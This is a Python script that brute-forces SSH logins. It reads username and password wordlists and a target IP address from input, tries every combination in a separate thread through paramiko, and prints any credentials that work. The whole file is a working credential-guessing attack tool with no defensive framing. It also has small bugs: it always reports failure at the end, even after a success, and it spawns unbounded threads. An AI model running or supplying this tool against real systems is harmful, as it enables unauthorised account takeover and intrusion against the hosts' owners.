import paramiko
import threading


def read_file_lines(file_path):
    with open(file_path) as f:
        lines = f.read().splitlines()
    return lines


def try_login(ip_address, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip_address, username=username, password=password, timeout=10)
        ssh.close()
        print(f"Valid credentials found: {username}:{password}")
        return True
    except paramiko.AuthenticationException:
        # Authentication failed
        print(f"Invalid credentials: {username}:{password}")
        pass
    except paramiko.SSHException:
        # Could not establish SSH connection
        print(f"Could not establish SSH connection: {username}:{password}")
        pass
    except Exception as e:
        # Other exceptions
        print(f"Error occurred: {e}")
    finally:
        ssh.close()
    return False


def attempt_login(ip_address, usernames, passwords):
    for username in usernames:
        for password in passwords:
            try:
                # Attempt SSH connection
                print(f"Trying: {username}:{password}")
                if try_login(ip_address, username, password):
                    return
            except Exception as e:
                print(f"Error occurred: {e}")


def main():
    # Prompt user for input
    username_file = input("Enter path to username file: ")
    password_file = input("Enter path to password file: ")
    ip_address = input("Enter IP address: ")

    # Read username and password files
    try:
        usernames = read_file_lines(username_file)
        passwords = read_file_lines(password_file)
    except Exception as e:
        print(f"Error occurred: {e}")
        return

    # Create threads for each combination of username/password
    threads = []
    for i in range(len(usernames)):
        for j in range(len(passwords)):
            t = threading.Thread(target=attempt_login, args=(ip_address, [usernames[i]], [passwords[j]]))
            threads.append(t)
            t.start()

    # Wait for threads to finish
    for t in threads:
        t.join()

    print("Could not find valid credentials.")


if __name__ == "__main__":
    main()
